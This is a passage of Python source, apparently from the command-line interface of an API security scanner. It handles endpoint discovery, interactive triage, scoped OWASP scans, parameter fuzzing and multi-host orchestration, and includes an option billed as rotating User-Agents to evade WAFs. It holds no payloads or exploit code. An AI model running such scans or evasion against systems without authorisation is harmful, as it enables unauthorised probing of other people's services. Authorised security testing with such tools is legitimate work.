            if not 1 <= index <= count:
                return None
            indices.add(index)

    if not indices:
        return None
    return sorted(indices)


def run_interactive_triage(
    records,
    ci_mode,
    interactive_flag,
    *,
    status_filter=None,
    follow_up=None,
    batch_follow_up=None,
    prompt_func=None,
    echo=None,
    max_invalid_attempts=3,
):
    """Run the opt-in interactive triage selection prompt (Requirement 16).

    Interactive triage is **disabled by default** and is engaged only when the
    caller explicitly opts in via ``interactive_flag`` (Requirement 16.4). It is
    **automatically disabled while CI_Mode is active** so no prompt is ever shown
    and execution continues without blocking a pipeline (Requirement 16.3). When
    the (filtered) record set is empty the prompt is skipped and no follow-up
    scan is initiated (Requirement 16.8).

    Otherwise the function presents the filtered records (in the same ascending
    status-class order as the triage table) and prompts for a selection
    (Requirement 16.1). The selection may name a single index, or multiple
    indices/ranges (e.g. ``1,3,5`` or ``2-4``). A single-index selection invokes
    ``follow_up`` exactly once with the chosen :class:`DiscoveryResult`,
    launching a single ``Targeted_Follow_Up_Scan`` scoped to that endpoint
    (Requirement 16.2). A selection of two or more records instead invokes
    ``batch_follow_up`` once with the selected records, defining a
    ``Batch_Scan_Scope`` (Requirement 36.1). An invalid selection re-prompts
    without starting a scan, up to a maximum of 3 consecutive invalid attempts;
    after the 3rd the function exits interactive mode without a scan and prints a
    "selection abandoned" message (Requirements 16.6, 16.7).

    Args:
        records: The in-memory discovery records (already the reload source of
            truth when ``--load-session`` was used, Requirement 16.5).
        ci_mode: Whether CI_Mode is active; ``True`` disables the prompt.
        interactive_flag: The explicit opt-in flag; ``False`` disables the prompt.
        status_filter: The parsed status filter so the selectable set matches the
            displayed (filtered) table.
        follow_up: Callable invoked with the selected record to launch the
            single-endpoint targeted follow-up scan. Optional so the selection
            logic stays testable in isolation.
        batch_follow_up: Callable invoked with the list of selected records when
            two or more are chosen, launching a Batch_Scan_Scope OWASP scan
            (Requirement 36.1). Optional.
        prompt_func: Callable taking a prompt message and returning the raw user
            input; defaults to a ``click.prompt`` wrapper. Injectable for tests.
        echo: Callable used for output; defaults to :func:`click.echo`.
        max_invalid_attempts: Maximum consecutive invalid selections before the
            prompt is abandoned (defaults to 3, Requirement 16.6).

    Returns:
        The selected :class:`DiscoveryResult` for a single-index selection, the
        list of selected records for a multi-index selection, otherwise ``None``
        (disabled, CI mode, empty table, or abandoned).
    """
    log = get_logger("dir")
    echo = echo or click.echo

    # Opt-in: disabled by default (Requirement 16.4).
    if not interactive_flag:
        return None

    # Automatically disabled in CI mode — no prompt, never blocks (Req 16.3).
    if ci_mode:
        log.info("Interactive triage disabled in CI mode")
        return None

    # Build the displayed record list in the same filtered, ascending
    # status-class order used by the triage table so selection indices line up
    # with what the user sees (Requirements 16.1, 15.4, 15.5).
    filtered = apply_status_filter(records, status_filter)
    grouped = group_by_status_class(filtered)
    displayed = [record for class_records in grouped.values() for record in class_records]

    # Empty (filtered) table: skip the prompt, initiate no scan (Req 16.8).
    if not displayed:
        log.info("Interactive triage skipped: no records to display")
        return None

    if prompt_func is None:
        def prompt_func(message):
            return click.prompt(message, default="", show_default=False)

    echo("\nSelect endpoint(s) for a follow-up scan:")
    echo("  Enter a single index for a targeted scan, or multiple "
         "indices/ranges (e.g. 1,3,5 or 2-4) for a batch OWASP scan.")
    for index, record in enumerate(displayed, start=1):
        echo(f"  {index}. [{record.status_code}] {record.method} {record.url}")

    invalid_attempts = 0
    while invalid_attempts < max_invalid_attempts:
        try:
            raw = prompt_func(f"Enter selection (1-{len(displayed)})")
        except (EOFError, click.Abort):
            raw = ""

        selection = (raw or "").strip()
        chosen_indices = _parse_selection_indices(selection, len(displayed))

        if chosen_indices is None:
            # Invalid selection: re-prompt without launching a scan (Req 16.6).
            invalid_attempts += 1
            remaining = max_invalid_attempts - invalid_attempts
            if remaining > 0:
                echo(
                    f"Invalid selection. Please try again "
                    f"({remaining} attempt(s) remaining).",
                    err=True,
                )
            continue

        selected_records = [displayed[index - 1] for index in chosen_indices]

        if len(selected_records) >= 2:
            # Two or more records: define a Batch_Scan_Scope (Req 36.1) and launch
            # a single scoped OWASP scan over the selected set.
            log.info(
                "Interactive triage batch selection",
                endpoints=len(selected_records),
            )
            if batch_follow_up is not None:
                batch_follow_up(selected_records)
            return selected_records

        # Single record: launch exactly one Targeted_Follow_Up_Scan (Req 16.2).
        selected = selected_records[0]
        log.info(
            "Interactive triage selection",
            url=selected.url,
            method=selected.method,
        )
        if follow_up is not None:
            follow_up(selected)
        return selected

    # 3 consecutive invalid selections: abandon without a scan (Req 16.6, 16.7).
    echo(
        "Selection abandoned after 3 invalid attempts. "
        "No follow-up scan was started.",
        err=True,
    )
    log.info("Interactive triage abandoned after invalid selections")
    return None


def _run_targeted_follow_up_scan(
    selected,
    *,
    rate_limit,
    user_agent_random,
    user_agent_custom,
    user_agent_file,
    jwt,
    response,
    output,
    detect_framework,
    fuzz_versions,
    header=(),
    cookie=None,
    basic_auth=None,
    proxy=None,
    proxy_verify_ssl=False,
    logger,
):
    """Launch one ``Targeted_Follow_Up_Scan`` scoped to ``selected`` (Req 16.2).

    Reuses the existing discovery/scan path (:func:`run_enhanced_apileak`) but
    scopes it to the single selected endpoint by using the record's URL as the
    scan target and restricting the tested methods to the selected method.

    Args:
        selected: The :class:`DiscoveryResult` chosen by the user.
        rate_limit, user_agent_*, jwt, response, output, detect_framework,
        fuzz_versions: The same discovery options passed to the ``dir`` command,
            so the follow-up honors the user's original settings.
        header, cookie, basic_auth: The same Discovery_Header_Option values
            supplied to the originating ``dir`` invocation, re-applied to the
            scoped config so the follow-up scan sends them on every request
            (Requirement 24.7).
        logger: The command logger.
    """
    logger.info(
        "Targeted follow-up scan starting",
        url=selected.url,
        method=selected.method,
    )
    click.echo(
        f"🎯 Starting targeted follow-up scan: {selected.method} {selected.url}"
    )

    user_agent_config = None
    if user_agent_random:
        user_agent_config = {'random': True}
    elif user_agent_custom:
        user_agent_config = {'custom': user_agent_custom}
    elif user_agent_file:
        user_agents = load_user_agents_from_file(user_agent_file)
        user_agent_config = {'file_list': user_agents}

    output_filename = prepare_output_filename(output)

    advanced_config = {
        'detect_framework': detect_framework,
        'fuzz_versions': fuzz_versions,
        'framework_confidence': 0.6,
    }

    # Re-apply the operator-supplied discovery headers, cookie, and basic-auth so
    # the Targeted_Follow_Up_Scan inherits the same Discovery_Header_Option values
    # as the originating dir invocation (Requirement 24.7). The cookie rides the
    # same custom_headers path as --header.
    extra_headers = parse_header_options(header)
    if cookie:
        extra_headers['Cookie'] = cookie
    basic_auth_creds = parse_basic_auth(basic_auth)

    # Scope the scan to the single selected endpoint URL (no wordlist expansion).
    config_dict = create_default_config(
        selected.url, None, "dir", user_agent_config, output_filename,
        advanced_config, None, extra_headers, basic_auth_creds,
    )
    config_dict['proxy'] = proxy
    config_dict['proxy_verify_ssl'] = proxy_verify_ssl

    if rate_limit:
        config_dict['rate_limiting']['requests_per_second'] = rate_limit
    # Restrict to the selected endpoint's method so the follow-up stays scoped.
    config_dict['fuzzing']['endpoints']['methods'] = [selected.method]
    if jwt:
        config_dict['authentication']['contexts'][0]['token'] = jwt
        config_dict['authentication']['contexts'][0]['type'] = 'bearer'
    if response:
        config_dict['fuzzing']['response_filter'] = parse_response_codes(response)

    config_manager = ConfigurationManager()
    apileak_config = config_manager.load_config_from_dict(config_dict)

    validation_errors = config_manager.validate_configuration()
    if validation_errors:
        logger.error(
            "Targeted follow-up scan configuration invalid",
            errors=validation_errors,
        )
        for error in validation_errors:
            click.echo(f"Error: {error}", err=True)
        return

    asyncio.run(run_enhanced_apileak(apileak_config))


def _run_scoped_owasp_scan(
    selected_records,
    *,
    target,
    rate_limit,
    user_agent_random,
    user_agent_custom,
    user_agent_file,
    jwt,
    response,
    output,
    detect_framework=False,
    fuzz_versions=False,
    header=(),
    cookie=None,
    basic_auth=None,
    proxy=None,
    proxy_verify_ssl=False,
    logger,
):
    """Launch one OWASP scan scoped to ``selected_records`` (Batch_Scan_Scope, Req 36).

    Generalizes :func:`_run_targeted_follow_up_scan` from a single endpoint to N
    selected :class:`DiscoveryResult` records. The selected set is threaded into
    ``run_enhanced_apileak(..., scope_endpoints=...)`` which seeds
    ``APILeakCore.run_scan(scope_endpoints=...)``, so the OWASP modules consume
    exactly the seeded endpoints and wordlist discovery is skipped
    (Requirements 36.3, 36.8). The scan runs through the Full_Command engine scan
    path so the OWASP_Modules execute against the seeded set.

    The same Rate_Limit, User_Agent_Option, Discovery_Header_Option, and auth
    values supplied to the originating ``dir`` invocation are rebuilt onto the
    scoped config so every request the scan issues inherits them
    (Requirement 36.5).

    An empty determined scope performs no scan and reports that there is nothing
    to scan (Requirement 36.6).

    Args:
        selected_records: The selected :class:`DiscoveryResult` records forming
            the Batch_Scan_Scope.
        target: The originating ``dir`` target URL, used as the scan's base URL.
        rate_limit, user_agent_*, jwt, response, output, detect_framework,
        fuzz_versions: The same discovery options supplied to the ``dir`` command,
            re-applied so the scoped scan honors the operator's settings.
        header, cookie, basic_auth: The same Discovery_Header_Option values
            supplied to the originating ``dir`` invocation, re-applied so the
            scoped scan sends them on every request (Requirement 36.5).
        proxy, proxy_verify_ssl: Proxy settings carried through unchanged.
        logger: The command logger.
    """
    # Empty determined scope: perform no scan, report nothing to scan (Req 36.6).
    if not selected_records:
        logger.info("Scoped OWASP scan skipped: empty scope")
        click.echo("Nothing to scan: the selected scope contains no endpoints.")
        return

    logger.info(
        "Scoped OWASP scan starting",
        endpoints=len(selected_records),
    )
    click.echo(
        f"🎯 Starting scoped OWASP scan over {len(selected_records)} endpoint(s)"
    )

    user_agent_config = None
    if user_agent_random:
        user_agent_config = {'random': True}
    elif user_agent_custom:
        user_agent_config = {'custom': user_agent_custom}
    elif user_agent_file:
        user_agents = load_user_agents_from_file(user_agent_file)
        user_agent_config = {'file_list': user_agents}

    output_filename = prepare_output_filename(output)

    advanced_config = {
        'detect_framework': detect_framework,
        'fuzz_versions': fuzz_versions,
        'framework_confidence': 0.6,
    }

    # Re-apply the operator-supplied discovery headers, cookie, and basic-auth so
    # the scoped scan inherits the same Discovery_Header_Option values as the
    # originating dir invocation (Requirement 36.5). The cookie rides the same
    # custom_headers path as --header.
    extra_headers = parse_header_options(header)
    if cookie:
        extra_headers['Cookie'] = cookie
    basic_auth_creds = parse_basic_auth(basic_auth)

    # Build a "full" engine config so the OWASP_Modules run against the seeded
    # endpoints (Requirement 36.3). scope_endpoints seeds the discovery phase
    # directly, so no wordlist is needed.
    config_dict = create_enhanced_config(
        target, None, "full", user_agent_config, output_filename,
        advanced_config, None, False, "critical", False,
        extra_headers, basic_auth_creds,
    )
    config_dict['proxy'] = proxy
    config_dict['proxy_verify_ssl'] = proxy_verify_ssl

    # Rebuild the same rate-limit override the originating dir used (Req 36.5).
    if rate_limit:
        config_dict['rate_limiting']['requests_per_second'] = rate_limit
    if jwt:
        config_dict['authentication']['contexts'][0]['token'] = jwt
        config_dict['authentication']['contexts'][0]['type'] = 'bearer'
    if response:
        config_dict['fuzzing']['response_filter'] = parse_response_codes(response)

    config_manager = ConfigurationManager()
    apileak_config = config_manager.load_config_from_dict(config_dict)

    validation_errors = config_manager.validate_configuration()
    if validation_errors:
        logger.error(
            "Scoped OWASP scan configuration invalid",
            errors=validation_errors,
        )
        for error in validation_errors:
            click.echo(f"Error: {error}", err=True)
        return

    # Thread the selected set into the engine scan path so the OWASP modules
    # consume exactly the seeded endpoints (Requirements 36.3, 36.8).
    asyncio.run(
        run_enhanced_apileak(apileak_config, scope_endpoints=selected_records)
    )



# ---------------------------------------------------------------------------
# Multi-target orchestration helpers
# ---------------------------------------------------------------------------


def _run_dir_core(*, target, ctx,
                  wordlist, openapi, postman, output,
                  log_level, log_file, json_logs, rate_limit, methods,
                  fuzz_keyword, fuzz_mode, depth, recursive, max_requests,
                  concurrency, confirm_hits, timeout, retries, extensions,
                  user_agent_random, user_agent_custom, user_agent_file,
                  jwt, header, cookie, basic_auth, enumerate_methods, graphql,
                  response, status_code, match_size, match_words, match_lines,
                  match_regex, match_time, filter_size, filter_words,
                  filter_lines, filter_regex, filter_time, detect_framework,
                  fuzz_versions, save_session, load_session, checkpoint, resume,
                  export_format, export_file, output_format, output_file,
                  interactive, scan_scope, ci_mode, proxy, proxy_verify_ssl,
                  client_cert, ca_bundle, allow_cross_domain_redirects, resolve,
                  detect_secrets, secret_patterns, include_path, exclude_path,
                  include_status, exclude_status, recursion_status, recursion_type,
                  spec_methods_only, quarantine_threshold=None,
                  marker_only_requested=False):
    """Core single-target discovery pipeline for the ``dir`` command.

    Returns a summary dict:
        target        – the URL scanned
        endpoints     – number of discovered (non-404) endpoints
        valid         – 2xx endpoint count
        auth_required – 401/403 endpoint count
        error         – error message string, or None on success
        report_files  – list of generated report file paths
    """
    import asyncio as _asyncio

    summary = {
        "target": target, "endpoints": 0, "valid": 0,
        "auth_required": 0, "error": None, "report_files": [],
    }

    validate_user_agent_options(user_agent_random, user_agent_custom, user_agent_file)
    validate_basic_auth_options(basic_auth, jwt)
    setup_logging(level=log_level, json_logs=json_logs, log_file=log_file)
    _logger = get_logger("dir")

    match_exprs = (
        [f"size:{e}" for e in match_size] + [f"words:{e}" for e in match_words]
        + [f"lines:{e}" for e in match_lines] + [f"regex:{e}" for e in match_regex]
        + [f"time:{e}" for e in match_time]
    )
    filter_exprs = (
        [f"size:{e}" for e in filter_size] + [f"words:{e}" for e in filter_words]
        + [f"lines:{e}" for e in filter_lines] + [f"regex:{e}" for e in filter_regex]
        + [f"time:{e}" for e in filter_time]
    )
    try:
        matchers, filters = parse_selectors(match_exprs, filter_exprs)
        path_scope = parse_path_scope(include_path, exclude_path)
        storage_status = parse_storage_status_selection(include_status, exclude_status)
        recursion_scope = parse_recursion_scope(recursion_status, recursion_type)
    except (SelectorError, PathScopeError, StorageStatusError, RecursionScopeError) as exc:
        summary["error"] = str(exc)
        return summary

    if scan_scope is not None:
        try:
            select_scope_records([], scan_scope)
        except ScanScopeError as exc:
            summary["error"] = str(exc)
            return summary

    marker_wordlists = None
    try:
        resolved_fuzz_keyword = validate_fuzz_keyword(fuzz_keyword)
        markers = find_markers(target, resolved_fuzz_keyword)
        resolved_fuzz_mode = parse_fuzz_mode(fuzz_mode)
        # marker_only_requested is True when --fuzz-keyword or --fuzz-mode were
        # explicitly given on the CLI (passed in from the dir command via ctx).
        # When True and no marker is found in the target URL, that is a config
        # error (Requirement 46.2).
        if not markers and marker_only_requested:
            raise ValueError(
                f"no Fuzz_Marker found in target URL {target!r} "
                f"for keyword {resolved_fuzz_keyword!r}"
            )
        if markers:
            wordlist_sources = [[src] for src in wordlist]
            associated_sources = associate_wordlists(markers, wordlist_sources)
            marker_wordlists = []
            for assoc in associated_sources:
                try:
                    marker_wordlists.append(_read_wordlist_entries(assoc[0]))
                except OSError as exc2:
                    raise ValueError(
                        f"unreadable wordlist source '{assoc[0]}': {exc2}"
                    ) from exc2
            if resolved_fuzz_mode == FuzzMode.PITCHFORK:
                for marker, entries in zip(markers, marker_wordlists, strict=False):
                    if not entries:
                        raise ValueError(
                            f"Pitchfork_Mode requires a non-empty wordlist for "
                            f"every marker; the wordlist for marker at order "
                            f"{marker.order} is empty"
                        )
    except ValueError as exc:
        summary["error"] = str(exc)
        return summary

    try:
        candidate_set, seed_methods, wordlist_path = _resolve_dir_candidates(
            wordlist, openapi, postman
        )
    except SpecImportError as exc:
        summary["error"] = str(exc)
        return summary

    if candidate_set is not None and not candidate_set and not load_session:
        click.echo("No candidates available: no wordlist entries or spec seeds to scan.")
        return summary

    resume_checkpoint = None
    if resume:
        try:
            resume_checkpoint = DiscoveryCheckpoint.load(resume)
        except DiscoveryCheckpointError as exc:
            summary["error"] = str(exc)
            return summary

    triage_requested = bool(
        save_session or load_session or export_format or export_file
        or output_format or output_file or interactive or scan_scope
        or matchers or filters
    )

    try:
        if triage_requested:
            _run_dir_triage(
                target=target, wordlist_path=wordlist_path,
                candidate_set=candidate_set, seed_methods=seed_methods,
                output=output, rate_limit=rate_limit, methods=methods,
                fuzz_keyword=resolved_fuzz_keyword,
                fuzz_mode=resolved_fuzz_mode.value,
                marker_wordlists=marker_wordlists,
                user_agent_random=user_agent_random,
                user_agent_custom=user_agent_custom,
                user_agent_file=user_agent_file,
                jwt=jwt, header=header, cookie=cookie, basic_auth=basic_auth,
                response=response, status_code=status_code,
                matchers=matchers, filters=filters,
                detect_framework=detect_framework, fuzz_versions=fuzz_versions,
                save_session=save_session, load_session=load_session,
                export_format=export_format, export_file=export_file,
                output_format=output_format, output_file=output_file,
                interactive=interactive, scan_scope=scan_scope,
                ci_mode=ci_mode, proxy=proxy, proxy_verify_ssl=proxy_verify_ssl,
                client_cert=client_cert, ca_bundle=ca_bundle,
                allow_cross_domain_redirects=allow_cross_domain_redirects,
                resolve=resolve, detect_secrets=detect_secrets,
                secret_patterns=secret_patterns, path_scope=path_scope,
                storage_status=storage_status, checkpoint=checkpoint,
                resume_checkpoint=resume_checkpoint,
                openapi_sources=openapi, postman_sources=postman,
                spec_methods_only=spec_methods_only,
                quarantine_threshold=quarantine_threshold,
                logger=_logger,
            )
            return summary

        # --- Non-triage path (direct scan) ---
        user_agent_config = None
        if user_agent_random:
            user_agent_config = {"random": True}
        elif user_agent_custom:
            user_agent_config = {"custom": user_agent_custom}
        elif user_agent_file:
            user_agents = load_user_agents_from_file(user_agent_file)
            user_agent_config = {"file_list": user_agents}

        output_filename = prepare_output_filename(output)
        advanced_config = {
            "detect_framework": detect_framework,
            "fuzz_versions": fuzz_versions,
            "framework_confidence": 0.6,
        }
        status_code_filter = parse_status_codes(status_code) if status_code else None
        extra_headers = parse_header_options(header)
        if cookie:
            extra_headers["Cookie"] = cookie
        basic_auth_creds = parse_basic_auth(basic_auth)

        config_dict = create_default_config(
            target, wordlist_path, "dir", user_agent_config, output_filename,
            advanced_config, status_code_filter, extra_headers, basic_auth_creds,
        )
        config_dict["proxy"] = proxy
        config_dict["proxy_verify_ssl"] = proxy_verify_ssl
        config_dict["client_cert"] = client_cert
        config_dict["ca_bundle"] = ca_bundle
        config_dict["resolve"] = resolve
        config_dict["fuzzing"]["endpoints"][
            "allow_cross_domain_redirects"
        ] = allow_cross_domain_redirects

        if candidate_set is not None:
            config_dict["fuzzing"]["endpoints"]["candidate_set"] = candidate_set
            config_dict["fuzzing"]["endpoints"]["seed_methods"] = seed_methods

        _dir_spec_schema = _build_dir_spec_schema(openapi, postman)
        if _dir_spec_schema is not None:
            config_dict["fuzzing"]["endpoints"]["spec_schema"] = _dir_spec_schema
        config_dict["fuzzing"]["endpoints"]["spec_methods_only"] = spec_methods_only
        if quarantine_threshold is not None:
            config_dict["fuzzing"]["endpoints"]["quarantine_threshold"] = quarantine_threshold

        if rate_limit:
            config_dict["rate_limiting"]["requests_per_second"] = rate_limit
        if methods:
            config_dict["fuzzing"]["endpoints"]["methods"] = [
                m.strip() for m in methods.split(",")
            ]
        config_dict["fuzzing"]["max_depth"] = resolve_max_depth(depth)
        if recursive is not None:
            config_dict["fuzzing"]["recursive"] = recursive
        if depth == 0:
            config_dict["fuzzing"]["recursive"] = False  # depth 0 => depth-0 pass only
        if max_requests is not None:
            config_dict["fuzzing"]["max_requests"] = max_requests
        if concurrency is not None:
            config_dict["fuzzing"]["concurrency"] = concurrency
        if confirm_hits is not None:
            config_dict["fuzzing"]["hit_confirmation"] = {
                "enabled": True, "count": confirm_hits
            }
        config_dict["fuzzing"]["endpoints"]["fuzz_keyword"] = resolved_fuzz_keyword
        config_dict["fuzzing"]["endpoints"]["fuzz_mode"] = resolved_fuzz_mode.value
        config_dict["fuzzing"]["endpoints"]["marker_wordlists"] = marker_wordlists
        config_dict["fuzzing"]["path_scope"] = path_scope
        config_dict["fuzzing"]["storage_status"] = storage_status
        config_dict["fuzzing"]["recursion_scope"] = recursion_scope
        if timeout is not None:
            config_dict["target"]["timeout"] = timeout
        if retries is not None:
            config_dict["fuzzing"]["retries"] = retries
        if enumerate_methods:
            config_dict["fuzzing"]["endpoints"]["enumerate_methods"] = True
        if graphql:
            config_dict["fuzzing"]["endpoints"]["graphql"] = True
        config_dict["fuzzing"]["endpoints"]["extensions"] = normalize_extensions(
            [ext for value in (extensions or ()) for ext in value.split(",")]
        )
        if jwt:
            config_dict["authentication"]["contexts"][0]["token"] = jwt
            config_dict["authentication"]["contexts"][0]["type"] = "bearer"
        if response:
            config_dict["fuzzing"]["response_filter"] = parse_response_codes(response)
        config_dict.setdefault("secret_scan", {})
        config_dict["secret_scan"]["enabled"] = detect_secrets
        if secret_patterns is not None:
            config_dict["secret_scan"]["patterns"] = secret_patterns

        config_manager = ConfigurationManager()
        apileak_config = config_manager.load_config_from_dict(config_dict)
        validation_errors = config_manager.validate_configuration()
        if validation_errors:
            summary["error"] = "; ".join(validation_errors)
            return summary

        discovery_progress = _build_discovery_progress(
            ci_mode, apileak_config.fuzzing.max_requests
        )
        _asyncio.run(
            run_enhanced_apileak(
                apileak_config,
                ci_mode=ci_mode,
                fail_on="critical",
                discovery_progress=discovery_progress,
                checkpoint_path=checkpoint,
                resume_checkpoint=resume_checkpoint,
            )
        )
        return summary

    except (DiscoveryCheckpointError, DiscoverySessionError,
            DiscoveryExportError, DiscoveryOutputError,
            SpecImportError, ValueError, OSError) as exc:
        # Only catch expected operational error types so that test sentinel
        # exceptions (and other BaseException subclasses) propagate naturally.
        summary["error"] = str(exc)
        _logger.error("Single-target dir scan failed", target=target, error=str(exc))
        return summary


def _run_dir_multi_target(*, targets, ctx, **kwargs):
    """Scan targets and print a summary table.

    When ``parallel_hosts`` > 1 (set via ``--parallel-hosts / -j``), scans up to
    that many hosts concurrently using a ``ThreadPoolExecutor``.  Each host runs
    ``_run_dir_core`` in its own thread (each thread has its own asyncio event
    loop, so ``asyncio.run()`` inside ``_run_dir_core`` works correctly).
    Sequential mode (``parallel_hosts`` <= 1, the default) preserves the existing
    behaviour exactly.
    """
    import concurrent.futures
    import threading
    from urllib.parse import urlparse as _urlparse

    _RESET  = "\033[0m"
    _BOLD   = "\033[1m"
    _GREEN  = "\033[92m"
    _RED    = "\033[91m"
    _CYAN   = "\033[96m"
    _YELLOW = "\033[93m"

    parallel_hosts = kwargs.pop("parallel_hosts", 1) or 1
    total = len(targets)

    mode_label = f"parallel (j={parallel_hosts})" if parallel_hosts > 1 else "sequential"
    click.echo(
        f"\n{_BOLD}{_CYAN}Multi-target scan: {total} host(s) [{mode_label}]{_RESET}\n"
        f"{'─' * 60}"
    )

    # Per-target work: build kwargs, run scan, return summary.
    _print_lock = threading.Lock()

    def _scan_one(idx_target):
        idx, t = idx_target
        hostname = _urlparse(t).netloc or t
        base_output = kwargs.get("output")
        if base_output:
            per_target_output = f"{base_output}_{hostname.replace(':', '_')}"
        else:
            safe_name = hostname.replace(":", "_").replace("/", "_")
            per_target_output = f"scan_{safe_name}"

        per_kwargs = dict(kwargs)
        per_kwargs["output"] = per_target_output
        per_kwargs["interactive"] = False

        if parallel_hosts > 1:
            with _print_lock:
                click.echo(f"\n{_BOLD}[{idx}/{total}]{_RESET} {_CYAN}{t}{_RESET} starting…")
        else:
            click.echo(f"\n{_BOLD}[{idx}/{total}]{_RESET} {_CYAN}{t}{_RESET}")

        result = _run_dir_core(target=t, ctx=ctx, **per_kwargs)
        result["hostname"] = hostname

        with _print_lock:
            if result["error"]:
                click.echo(f"  {_RED}✗ [{hostname}] Error: {result['error']}{_RESET}")
            else:
                click.echo(
                    f"  {_GREEN}✓{_RESET} [{hostname}] "
                    f"endpoints={result['endpoints']}  "
                    f"valid={result['valid']}  "
                    f"auth_req={result['auth_required']}"
                )
        return result

    # Run scans
    if parallel_hosts <= 1:
        summaries = [_scan_one((idx, t)) for idx, t in enumerate(targets, 1)]
    else:
        workers = min(parallel_hosts, total)
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
            summaries = list(pool.map(_scan_one, enumerate(targets, 1)))

    # Consolidated summary
    col_host = 40
    click.echo(
        f"\n{_BOLD}{_CYAN}{'═' * 60}\n  MULTI-TARGET SUMMARY  ({total} hosts)\n"
        f"{'═' * 60}{_RESET}"
    )
    click.echo(
        f"{_BOLD}{'HOST':<{col_host}} {'ENDPOINTS':>9} {'VALID':>7}"
        f" {'AUTH_REQ':>9} {'STATUS':<8}{_RESET}"
    )
    click.echo("─" * 75)

    success_count = error_count = 0
    for s in summaries:
        host_d = s["hostname"][:col_host - 1] if len(s["hostname"]) > col_host else s["hostname"]
        if s["error"]:
            error_count += 1
            click.echo(
                f"{host_d:<{col_host}} {'—':>9} {'—':>7} {'—':>9}"
                f" {_RED}ERROR{_RESET}"
            )
        else:
            success_count += 1
            click.echo(
                f"{host_d:<{col_host}} {s['endpoints']:>9} {s['valid']:>7}"
                f" {s['auth_required']:>9} {_GREEN}OK{_RESET}"
            )

    click.echo("─" * 75)
    click.echo(
        f"\n{_BOLD}Total:{_RESET} {total}  "
        f"{_GREEN}Success: {success_count}{_RESET}  "
        f"{_RED}Errors: {error_count}{_RESET}\n"
    )


def _run_par_multi_target(targets, *, ctx, **kwargs):
    """Fuzz parameters across multiple targets sequentially and print a summary."""
    from urllib.parse import urlparse as _urlparse

    _RESET  = "\033[0m"
    _BOLD   = "\033[1m"
    _GREEN  = "\033[92m"
    _RED    = "\033[91m"
    _CYAN   = "\033[96m"

    total = len(targets)
    click.echo(
        f"\n{_BOLD}{_CYAN}Multi-target parameter fuzzing: {total} host(s){_RESET}\n"
        f"{'─' * 60}"
    )

    summaries = []
    for idx, t in enumerate(targets, 1):
        hostname = _urlparse(t).netloc or t
        click.echo(f"\n{_BOLD}[{idx}/{total}]{_RESET} {_CYAN}{t}{_RESET}")
        base_output = kwargs.get("output")
        per_output = (
            f"{base_output}_{hostname.replace(':', '_')}"
            if base_output
            else f"par_{hostname.replace(':', '_').replace('/', '_')}"
        )
        per_kwargs = dict(kwargs)
        per_kwargs["output"] = per_output

        error_msg = None
        try:
            # Re-invoke the par command body logic with the per-target URL by
            # calling the underlying ctx.invoke path — the simplest approach is
            # to call par.invoke(ctx) after patching, but Click doesn't support
            # that cleanly; instead we re-invoke the full command via
            # ctx.invoke so Click handles parameter injection.
            ctx.invoke(par, target=t, target_file=None, max_hosts=None, **per_kwargs)
            click.echo(f"  {_GREEN}✓ Completed{_RESET}")
        except SystemExit as exc:
            error_msg = f"exited with code {exc.code}"
            click.echo(f"  {_RED}✗ {error_msg}{_RESET}")
        except Exception as exc:
            error_msg = str(exc)
            click.echo(f"  {_RED}✗ {error_msg}{_RESET}")

        summaries.append({"hostname": hostname, "error": error_msg})

    # Summary table
    col = 50
    click.echo(
        f"\n{_BOLD}{_CYAN}{'═' * 60}\n  MULTI-TARGET PAR SUMMARY  ({total} hosts)\n"
        f"{'═' * 60}{_RESET}"
    )
    click.echo(f"{_BOLD}{'HOST':<{col}} {'STATUS'}{_RESET}")
    click.echo("─" * 65)
    success_count = error_count = 0
    for s in summaries:
        h = s["hostname"][:col - 1] if len(s["hostname"]) >= col else s["hostname"]
        if s["error"]:
            error_count += 1
            click.echo(f"{h:<{col}} {_RED}ERROR — {s['error'][:30]}{_RESET}")
        else:
            success_count += 1
            click.echo(f"{h:<{col}} {_GREEN}OK{_RESET}")
    click.echo("─" * 65)
    click.echo(
        f"\n{_BOLD}Total:{_RESET} {total}  "
        f"{_GREEN}Success: {success_count}{_RESET}  "
        f"{_RED}Errors: {error_count}{_RESET}\n"
    )


@cli.command()
@click.option('--target', '-t', required=False, default=None,
              help='Target URL to scan. Required unless --target-file is supplied.')
@click.option('--target-file', 'target_file', default=None,
              type=click.Path(exists=True, readable=True,
                              file_okay=True, dir_okay=False),
              metavar='FILE',
              help='Plain-text file with one target URL per line (# comments and blank '
                   'lines are skipped). Lines without a scheme are auto-prefixed with '
                   'https://. When supplied, --target is optional.')
@click.option('--max-hosts', 'max_hosts', type=int, default=None, metavar='N',
              help='Maximum number of hosts to scan from --target-file (scans the first N).')
@click.option('--wordlist', '-w', 'wordlist', multiple=True,
              help='Wordlist file of candidate parameter names for parameter '
                   'fuzzing. Repeatable; merged and de-duplicated across all '
                   'values. Use "-" to read entries from stdin. Defaults to '
                   'wordlists/parameters.txt when omitted.')
@click.option('--output', '-o', help='Output filename for reports (files will be saved in reports/ directory)')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']),
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.option('--methods', default='GET,POST', callback=_validate_methods,
              help='HTTP methods to test (comma-separated)')
@click.option('--user-agent-random', is_flag=True, help='Use random User-Agent headers to evade WAF')
@click.option('--user-agent-custom', help='Custom User-Agent string to use for all requests')
@click.option('--user-agent-file', help='File containing User-Agent strings (one per line) for rotation')
@click.option('--jwt', help='JWT token to use for authentication')
@click.option('--response', help='Filter by response codes (e.g., 200,301,404 or 200-300)')
@click.option('--status-code', help='Show only HTTP requests with specific status codes (e.g., 200,404 or 200-300)')
@click.option('--detect-framework', '--df', is_flag=True, help='Enable framework detection during parameter fuzzing')
@click.option('--proxy', help='Route all HTTP traffic through an intercepting proxy (e.g. Burp/Caido/Hetty: http://127.0.0.1:8080). TLS verification is disabled by default for proxied HTTPS targets.')
@click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, help='Keep TLS certificate verification enabled when using --proxy (use after installing the proxy CA).')
@click.option('--fuzz-keyword', 'fuzz_keyword', default='FUZZ', show_default=True,
              metavar='KEYWORD',
              help='Literal token in the target URL marking positions to fuzz. '
                   'When present, par runs in Marker_Mode and the repeatable '
                   '--wordlist values are the per-marker wordlists in marker order.')
